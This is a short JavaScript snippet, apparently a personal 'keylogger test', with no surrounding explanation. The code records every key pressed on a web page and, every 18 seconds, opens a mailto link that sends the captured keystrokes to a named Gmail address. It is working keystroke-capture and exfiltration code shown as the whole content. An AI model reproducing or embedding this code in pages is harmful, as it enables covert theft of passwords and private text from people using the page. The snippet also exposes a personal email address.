let pressedKeys = [];
window.addEventListener('keydown', e => {
    pressedKeys.push(e.key)
});



const trigger = ()=> {
    let msg = makeMsg();
    window.open(`mailto:thalisfernandesrodrigues@gmail.com?subject=keylogger test&body=${msg}`);
}
const makeMsg = () => {
    return pressedKeys.join('')
};


setInterval(trigger, 18000);